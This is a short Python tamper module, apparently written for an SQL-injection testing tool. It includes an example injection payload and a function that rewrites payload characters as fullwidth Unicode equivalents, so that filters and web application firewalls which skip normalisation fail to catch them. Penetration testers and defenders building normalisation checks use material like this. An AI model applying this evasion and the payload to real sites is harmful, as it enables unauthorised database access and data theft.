__example_payload__ = "' AND 1=1 UNION SELECT NULL--"
__type__ = "replace ASCII characters with NFKC-equivalent fullwidth Unicode forms"
__category__ = "encoding"
__chain_stage__ = "normalization"
__contexts__ = ("query", "form", "json")


def tamper(payload, **kwargs):
    if not payload:
        return payload

    transformed = []
    for char in payload:
        codepoint = ord(char)
        if char == " ":
            transformed.append("\u3000")
        elif 0x21 <= codepoint <= 0x7E:
            transformed.append(chr(codepoint + 0xFEE0))
        else:
            transformed.append(char)
    return "".join(transformed)
